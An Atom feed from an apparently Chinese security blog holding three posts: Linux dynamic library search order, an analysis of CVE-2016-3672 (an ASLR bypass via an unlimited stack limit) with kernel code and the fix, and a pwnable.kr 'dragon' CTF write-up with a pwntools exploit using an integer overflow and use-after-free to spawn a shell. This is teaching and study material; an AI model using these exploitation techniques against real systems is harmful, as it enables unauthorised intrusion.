<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WeaponX&#39;s Blog</title>
  <subtitle>Binary</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://weaponx.site/"/>
  <updated>2017-03-23T09:52:34.014Z</updated>
  <id>http://weaponx.site/</id>
  
  <author>
    <name>WeaponX</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux如何搜索动态库</title>
    <link href="http://weaponx.site/2017/03/23/Linux%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E5%8A%A8%E6%80%81%E5%BA%93/"/>
    <id>http://weaponx.site/2017/03/23/Linux如何搜索动态库/</id>
    <published>2017-03-23T09:39:36.000Z</published>
    <updated>2017-03-23T09:52:34.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在linux下安装一些程序，或者在做pwnable的时候经常出现没有找到动态库的情况。</p>
<h2 id="0x01-如何链接动态库"><a href="#0x01-如何链接动态库" class="headerlink" title="0x01 如何链接动态库"></a>0x01 如何链接动态库</h2><p>链接动态库通常有五中方法：</p>
<ol>
<li>链接时使用静态库，gcc编译时添加参数</li>
<li>使用<code>LD_LIBRARY_PATH</code>指定搜索路径, <code>export LD_LIBRARY_PATH=`pwd` </code></li>
<li>编译时使用<code>-rpath</code>指定动态库的搜索路径</li>
<li>修改<code>/etc/ld.so.conf</code>，添加动态库搜索路径</li>
<li>复制动态库到系统默认的路径下，如<code>/lib</code>，<code>/usr/lib</code></li>
</ol>
<h2 id="0x02-动态库搜索路径的优先级"><a href="#0x02-动态库搜索路径的优先级" class="headerlink" title="0x02 动态库搜索路径的优先级"></a>0x02 动态库搜索路径的优先级</h2><p>动态库搜索路径优先级由高到低排列情况如下：</p>
<ol>
<li>编译时指定动态库搜索路径</li>
<li>环境变量<code>LD_LIBRARY_PATH</code>中的路径</li>
<li>配置文件<code>/etc/ld/so.conf</code>中的路径</li>
<li>系统默认的路径<code>lib</code>等</li>
</ol>
<h2 id="0x03-Refer"><a href="#0x03-Refer" class="headerlink" title="0x03 Refer"></a>0x03 Refer</h2><p><a href="http://blog.csdn.net/liuxing_lanyue/article/details/20067423" target="_blank" rel="external">http://blog.csdn.net/liuxing_lanyue/article/details/20067423</a><br><a href="http://blog.csdn.net/onlyou930/article/details/6565906" target="_blank" rel="external">http://blog.csdn.net/onlyou930/article/details/6565906</a><br><a href="http://blog.chinaunix.net/uid-23069658-id-4028681.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-23069658-id-4028681.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;在linux下安装一些程序，或者在做pwnable的时候经常出现没有找到动态库的情况。&lt;/p&gt;
&lt;h
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="Linux" scheme="http://weaponx.site/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>mmap及linux地址空间随机化失效漏洞</title>
    <link href="http://weaponx.site/2017/03/13/mmap%E5%8F%8Alinux%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8C%96%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E/"/>
    <id>http://weaponx.site/2017/03/13/mmap及linux地址空间随机化失效漏洞/</id>
    <published>2017-03-13T09:54:42.000Z</published>
    <updated>2017-03-13T09:56:14.618Z</updated>
    
    <content type="html"><![CDATA[<p>nux下动态库是通过<code>mmap</code>建立起内存和文件的映射关系。其定义如下<code>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</code>，在第一个参数<code>start</code>为<code>NULL</code>的时候系统会随机分配一个地址，我们可以通过示例来看<code>mmap</code>映射地址的流程。</p>
<p>分析一下程序加载<code>libc.so</code>的流程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">open(<span class="string">"/lib/libc.so.6"</span>, O_RDONLY)        = 3</div><div class="line"><span class="built_in">read</span>(3, <span class="string">"\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 n\1\0004\0\0\0"</span>..., 512) = 512</div><div class="line">fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=1409436, ...&#125;) = 0</div><div class="line">mmap2(NULL, 1415560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb75b1000</div><div class="line">mmap2(0xb7705000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x154) = 0xb7705000</div><div class="line">mmap2(0xb7708000, 10632, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7708000</div><div class="line">close(3)</div></pre></td></tr></table></figure>
<p>在通常情况下通过<code>mmap</code>映射的地址会被内核进行随机化处理，所以每次程序运行加载的动态库基址都不相同。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~ $ ldd mmap</div><div class="line">    linux-gate.so.1 =&gt;  (0xb77d9000)</div><div class="line">    libc.so.6 =&gt; /lib/libc.so.6 (0xb7654000)</div><div class="line">    /lib/ld-linux.so.2 (0xb77bd000)</div><div class="line">~ $ ldd mmap</div><div class="line">    linux-gate.so.1 =&gt;  (0xb7738000)</div><div class="line">    libc.so.6 =&gt; /lib/libc.so.6 (0xb75b3000)</div><div class="line">    /lib/ld-linux.so.2 (0xb771c000)</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="0x01-CVE-2016-3672"><a href="#0x01-CVE-2016-3672" class="headerlink" title="0x01 CVE-2016-3672"></a>0x01 CVE-2016-3672</h2><blockquote>
<p>Linux kernel 4.5.2之前版本，arch/x86/mm/mmap.c内函数arch_pick_mmap_layout未正确随机化遗留基址。本地用户禁用栈资源消耗限制后，可破坏ADDR_NO_RANDOMIZE标记的限制，绕过setuid或setgid程序的ASLR保护机制。</p>
</blockquote>
<p>这个漏洞在32位操作系统或者在64位操作系统运行32位程序时，将栈空间设置为不限制，会导致<code>mmap</code>的ASLR失效，导致动态库加载的地址固定。</p>
<p>验证方法:</p>
<ol>
<li>设置栈空间为不限制大小<code>ulimit -s unlimited</code></li>
<li>使用ldd看动态库加载的地址是否发生变化</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~ $ ldd mmap</div><div class="line">   linux-gate.so.1 =&gt;  (0xb77d9000)</div><div class="line">   libc.so.6 =&gt; /lib/libc.so.6 (0xb7654000)</div><div class="line">   /lib/ld-linux.so.2 (0xb77bd000)</div><div class="line">~ $ ldd mmap</div><div class="line">   linux-gate.so.1 =&gt;  (0xb7738000)</div><div class="line">   libc.so.6 =&gt; /lib/libc.so.6 (0xb75b3000)</div><div class="line">   /lib/ld-linux.so.2 (0xb771c000)</div><div class="line">~ $ <span class="built_in">ulimit</span> <span class="_">-s</span> unlimited</div><div class="line">~ $ ldd mmap</div><div class="line">   linux-gate.so.1 =&gt;  (0x4001c000)</div><div class="line">   libc.so.6 =&gt; /lib/libc.so.6 (0x4002e000)</div><div class="line">   /lib/ld-linux.so.2 (0x40000000)</div><div class="line">~ $ ldd mmap</div><div class="line">   linux-gate.so.1 =&gt;  (0x4001c000)</div><div class="line">   libc.so.6 =&gt; /lib/libc.so.6 (0x4002e000)</div><div class="line">   /lib/ld-linux.so.2 (0x40000000)</div></pre></td></tr></table></figure>
<p>可见，设置了栈空间不限制大小后，动态库的基址就固定了。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞所在函数为<code>arch_pick_mmap_layout</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * This function, called very early during the creation of a new</div><div class="line"> * process VM image, sets up which VM layout function to use:</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span></div><div class="line">&#123;</div><div class="line">    mm-&gt;mmap_legacy_base = mmap_legacy_base();</div><div class="line">    mm-&gt;mmap_base = mmap_base();</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (mmap_is_legacy()) &#123;</div><div class="line">        mm-&gt;mmap_base = mm-&gt;mmap_legacy_base;</div><div class="line">        mm-&gt;get_unmapped_area = arch_get_unmapped_area;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果让ASLR失效则需要让<code>mm-&gt;mmap_base</code>为固定值。看看<code>mmap_legacy_base</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64</div><div class="line"> * does, but not when emulating X86_32</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">mmap_legacy_base</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (mmap_is_ia32())</div><div class="line">        <span class="keyword">return</span> TASK_UNMAPPED_BASE;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> TASK_UNMAPPED_BASE + mmap_rnd();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到<code>mmap_is_ia32()</code>为真时，返回的地址为固定值。注释更表明了影响32位机器和在64位机器上运行的32位程序。此时，只需要<code>mmap_is_legacy()</code>为真。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * Top of mmap area (just below the process stack).</div><div class="line"> *</div><div class="line"> * Leave an at least ~128 MB hole with possible stack randomization.</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_GAP (128*1024*1024UL + stack_maxrandom_size())</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_GAP (TASK_SIZE/6*5)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mmap_is_legacy</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT)</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (rlimit(RLIMIT_STACK) == RLIM_INFINITY)</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> sysctl_legacy_va_layout;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意到<code>rlimit(RLIMIT_STACK) == RLIM_INFINITY</code>则返回真，这就是<code>ulimit -s unlimited</code>的原因。</p>
<h2 id="0x03-修复方案分析"><a href="#0x03-修复方案分析" class="headerlink" title="0x03 修复方案分析"></a>0x03 修复方案分析</h2><figure class="highlight"><table><tr><td class="code"><pre><div class="line">diff --git a/arch/x86/mm/mmap.c b/arch/x86/mm/mmap.c</div><div class="line">index 96bd1e2..389939f 100644</div><div class="line">--- a/arch/x86/mm/mmap.c</div><div class="line">+++ b/arch/x86/mm/mmap.c</div><div class="line">@@ -94,18 +94,6 @@ static unsigned long mmap_base(unsigned long rnd)</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">- * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64</div><div class="line">- * does, but not when emulating X86_32</div><div class="line">- */</div><div class="line">-static unsigned long mmap_legacy_base(unsigned long rnd)</div><div class="line">-&#123;</div><div class="line">-   if (mmap_is_ia32())</div><div class="line">-       return TASK_UNMAPPED_BASE;</div><div class="line">-   else</div><div class="line">-       return TASK_UNMAPPED_BASE + rnd;</div><div class="line">-&#125;</div><div class="line">-</div><div class="line">-/*</div><div class="line">  * This function, called very early during the creation of a new</div><div class="line">  * process VM image, sets up which VM layout function to use:</div><div class="line">  */</div><div class="line">@@ -116,7 +104,7 @@ void arch_pick_mmap_layout(struct mm_struct *mm)</div><div class="line">    if (current-&gt;flags &amp; PF_RANDOMIZE)</div><div class="line">        random_factor = arch_mmap_rnd();</div><div class="line"></div><div class="line">-   mm-&gt;mmap_legacy_base = mmap_legacy_base(random_factor);</div><div class="line">+   mm-&gt;mmap_legacy_base = TASK_UNMAPPED_BASE + random_factor;</div><div class="line"></div><div class="line">    if (mmap_is_legacy()) &#123;</div><div class="line">        mm-&gt;mmap_base = mm-&gt;mmap_legacy_base;</div></pre></td></tr></table></figure>
<p>很简单，不管是以lagacy模式运行还是真正的32位程序，<code>mmap</code>的基址<code>mmap_base</code>均加入随即因子进行随机化</p>
<h2 id="0x04-题外"><a href="#0x04-题外" class="headerlink" title="0x04 题外"></a>0x04 题外</h2><p>在64位机器上发现也存在ASLR失效的问题，不过<code>vDSO</code>还是有随机化保护的。留个坑有时间在看看。</p>
<h2 id="0x05-Refer"><a href="#0x05-Refer" class="headerlink" title="0x05 Refer"></a>0x05 Refer</h2><p><a href="http://rk700.github.io/2016/11/22/mmap-aslr/" target="_blank" rel="external">http://rk700.github.io/2016/11/22/mmap-aslr/</a><br><a href="http://lists.alioth.debian.org/pipermail/kernel-svn-changes/2016-April/023114.html" target="_blank" rel="external">http://lists.alioth.debian.org/pipermail/kernel-svn-changes/2016-April/023114.html</a><br><a href="http://hmarco.org/bugs/CVE-2016-3672-Unlimiting-the-stack-not-longer-disables-ASLR.html" target="_blank" rel="external">http://hmarco.org/bugs/CVE-2016-3672-Unlimiting-the-stack-not-longer-disables-ASLR.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;nux下动态库是通过&lt;code&gt;mmap&lt;/code&gt;建立起内存和文件的映射关系。其定义如下&lt;code&gt;void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);&lt;/code&gt;，在第一个参数&lt;code&gt;start&lt;/code&gt;为&lt;code&gt;NULL&lt;/code&gt;的时候系统会随机分配一个地址，我们可以通过示例来看&lt;code&gt;mmap&lt;/code&gt;映射地址的流程。&lt;/p&gt;
&lt;p&gt;分析一下程序加载&lt;code&gt;libc.so&lt;/code&gt;的流程&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;open(&lt;span class=&quot;string&quot;&gt;&quot;/lib/libc.so.6&quot;&lt;/span&gt;, O_RDONLY)        = 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt;(3, &lt;span class=&quot;string&quot;&gt;&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 n\1\0004\0\0\0&quot;&lt;/span&gt;..., 512) = 512&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fstat64(3, &amp;#123;st_mode=S_IFREG|0755, st_size=1409436, ...&amp;#125;) = 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mmap2(NULL, 1415560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb75b1000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mmap2(0xb7705000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x154) = 0xb7705000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mmap2(0xb7708000, 10632, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7708000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;close(3)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在通常情况下通过&lt;code&gt;mmap&lt;/code&gt;映射的地址会被内核进行随机化处理，所以每次程序运行加载的动态库基址都不相同。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;~ $ ldd mmap&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    linux-gate.so.1 =&amp;gt;  (0xb77d9000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7654000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /lib/ld-linux.so.2 (0xb77bd000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;~ $ ldd mmap&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    linux-gate.so.1 =&amp;gt;  (0xb7738000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb75b3000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /lib/ld-linux.so.2 (0xb771c000)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ASLR" scheme="http://weaponx.site/tags/ASLR/"/>
    
  </entry>
  
  <entry>
    <title>dragon Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/03/09/dragon-Writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/03/09/dragon-Writeup-pwnable-kr/</id>
    <published>2017-03-10T04:54:07.000Z</published>
    <updated>2017-03-10T04:54:51.453Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-dragon"><a href="#0x00-dragon" class="headerlink" title="0x00 dragon"></a>0x00 dragon</h2><p>一个小游戏，我方可以选择牧师或者骑士(死亡骑士DK,23333)，牧师的技能有<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ Priest ] 12 HP / 0 MP</div><div class="line">    [ 1 ] Holy Bolt [ Cost : 10 MP ]</div><div class="line">        Deals 20 Damage.</div><div class="line">    [ 2 ] Clarity [ Cost : 0 MP ]</div><div class="line">        Refreshes All Mana.</div><div class="line">    [ 3 ] HolyShield [ Cost: 25 MP ]</div><div class="line">        You Become Temporarily Invincible.</div></pre></td></tr></table></figure></p>
<p>骑士的技能有</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ Knight ] 50 HP / 0 Mana</div><div class="line">    [ 1 ] Crash</div><div class="line">        Deals 20 Damage.</div><div class="line">    [ 2 ] Frenzy</div><div class="line">        Deals 40 Damage, But You Lose 20 HP.</div></pre></td></tr></table></figure>
<p>然后对手是个怪兽，按照怪兽儿子，怪兽妈妈这样的顺序，然后正常打是打不过的。</p>
<a id="more"></a>
<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>打赢怪兽后会进去这个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">SecretLevel</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+12h] [bp-16h]@1</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v2 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to Secret Level!\nInput Password : "</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%10s"</span>, &amp;s1);</div><div class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"Nice_Try_But_The_Dragons_Won't_Let_You!"</span>) )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">  &#125;</div><div class="line">  system(<span class="string">"/bin/sh"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v2;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>s1</code>只有10个字节的长度，而且这个函数有<code>stack canary</code>保护，所以肯定没法执行到<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>然后我们分析一下，如何打赢怪兽。</p>
<p>怪兽的内存区域是这样分配的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+----------+----------+--+--+----+----------+</div><div class="line">|   Func   |   id     |HP|Ab|    |  damage  |</div><div class="line">+----------+----------+--+--+----+----------+</div></pre></td></tr></table></figure>
<p>其中<code>id = 0</code>是Bady Dragon，<code>id = 1</code>是Mama Dragon。</p>
<p>万家英雄的内存区域是这样分配的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+----------+----------+----------+----------+</div><div class="line">|   id     |    HP    |    MP    |   Func   |</div><div class="line">+----------+----------+----------+----------+</div></pre></td></tr></table></figure>
<p>其中<code>id = 1</code>是Periest，<code>id = 2</code>是Knight。</p>
<p>战胜怪兽的判定是：</p>
<ol>
<li>我方HP &gt; 0</li>
<li>怪兽HP &lt;= 0</li>
</ol>
<p>通过正常打肯定是无法战胜的怪兽的，我们注意到一点，存放怪兽HP的内存区域只有1个字节，而且是有符号数。<code>所以，只要怪兽血量大于128就发生了整形溢出，导致判定怪兽血量为负数</code>。这样，玩家就获得了胜利。</p>
<p>我们可以注意到，怪兽有个特殊技能回血，所以只要让怪兽回血到128以上就可以取胜利。但是又同时注意到，怪兽攻击和回血是同一轮次的。所以应该在不对怪兽进行攻击的情况下撑下更多的轮次，而且要保证自己不死。</p>
<p>综上，只能在怪兽为<code>Mama</code>的情况下，使用牧师的<code>Clarity</code>和<code>HolyShield</code>。</p>
<p>所以，获得胜利使用的序列如下<code>1221332332332332</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">FightDragon</span><span class="params">(<span class="keyword">int</span> hero_choice)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// al@1</span></div><div class="line">  <span class="keyword">void</span> *hero_name; <span class="comment">// ST1C_4@10</span></div><div class="line">  <span class="keyword">int</span> FightResult; <span class="comment">// [sp+10h] [bp-18h]@7</span></div><div class="line">  _DWORD *humen; <span class="comment">// [sp+14h] [bp-14h]@1</span></div><div class="line">  _DWORD *monster; <span class="comment">// [sp+18h] [bp-10h]@1</span></div><div class="line"></div><div class="line">  humen = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</div><div class="line">  monster = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</div><div class="line">  v1 = Count++;</div><div class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    monster[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">    *((_BYTE *)monster + <span class="number">8</span>) = <span class="number">80</span>;</div><div class="line">    *((_BYTE *)monster + <span class="number">9</span>) = <span class="number">4</span>;</div><div class="line">    monster[<span class="number">3</span>] = <span class="number">10</span>;</div><div class="line">    *monster = PrintMonsterInfo;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Mama Dragon Has Appeared!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    monster[<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">    *((_BYTE *)monster + <span class="number">8</span>) = <span class="number">50</span>;               <span class="comment">// hp</span></div><div class="line">    *((_BYTE *)monster + <span class="number">9</span>) = <span class="number">5</span>;                <span class="comment">// special ability</span></div><div class="line">    monster[<span class="number">3</span>] = <span class="number">30</span>;                            <span class="comment">// demage</span></div><div class="line">    *monster = PrintMonsterInfo;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Baby Dragon Has Appeared!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( hero_choice == <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    *humen = <span class="number">1</span>;</div><div class="line">    humen[<span class="number">1</span>] = <span class="number">42</span>;</div><div class="line">    humen[<span class="number">2</span>] = <span class="number">50</span>;</div><div class="line">    humen[<span class="number">3</span>] = PrintPlayerInfo;</div><div class="line">    FightResult = PriestAttack((<span class="keyword">int</span>)humen, monster);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( hero_choice != <span class="number">2</span> )</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    *humen = <span class="number">2</span>;</div><div class="line">    humen[<span class="number">1</span>] = <span class="number">50</span>;</div><div class="line">    humen[<span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">    humen[<span class="number">3</span>] = PrintPlayerInfo;</div><div class="line">    FightResult = KnightAttack((<span class="keyword">int</span>)humen, monster);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( FightResult )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Well Done Hero! You Killed The Dragon!"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"The World Will Remember You As:"</span>);</div><div class="line">    hero_name = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</div><div class="line">    __isoc99_scanf(<span class="string">"%16s"</span>, hero_name);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"And The Dragon You Have Defeated Was Called:"</span>);</div><div class="line">    ((<span class="keyword">void</span> (__cdecl *)(_DWORD *))*monster)(monster);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"\nYou Have Been Defeated!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">free</span>(humen);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>获得胜利后注意到有个UAF，因为战胜怪兽后会<code>free(moster)</code>，后来又</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">hero_name = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</div><div class="line">__isoc99_scanf(<span class="string">"%16s"</span>, hero_name);</div></pre></td></tr></table></figure>
<p>所以输入的字符的内存空间指向<code>monster</code>，然后<code>((void (__cdecl *)(_DWORD *))*monster)(monster);</code>此时<code>EIP</code>会指向我们输入的前四个字符，此时指向执行<code>system(&quot;/bin/sh&quot;)</code>即可。</p>
<h2 id="0x02-exploit"><a href="#0x02-exploit" class="headerlink" title="0x02 exploit"></a>0x02 exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9004</span>)</div><div class="line"></div><div class="line">cmd_seq = <span class="string">"1221332332332332"</span></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd_seq:</div><div class="line">    io.sendline(c)</div><div class="line">addr = <span class="number">0x08048DBF</span></div><div class="line">io.sendline(p32(addr))</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>最终结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ ls</div><div class="line">dragon</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">MaMa, Gandhi was right! :)</div><div class="line">$</div><div class="line">[*] Closed connection to pwnable.kr port 9004</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-dragon&quot;&gt;&lt;a href=&quot;#0x00-dragon&quot; class=&quot;headerlink&quot; title=&quot;0x00 dragon&quot;&gt;&lt;/a&gt;0x00 dragon&lt;/h2&gt;&lt;p&gt;一个小游戏，我方可以选择牧师或者骑士(死亡骑士DK,23333)，牧师的技能有&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[ Priest ] 12 HP / 0 MP&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [ 1 ] Holy Bolt [ Cost : 10 MP ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        Deals 20 Damage.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [ 2 ] Clarity [ Cost : 0 MP ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        Refreshes All Mana.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [ 3 ] HolyShield [ Cost: 25 MP ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        You Become Temporarily Invincible.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;骑士的技能有&lt;/p&gt;
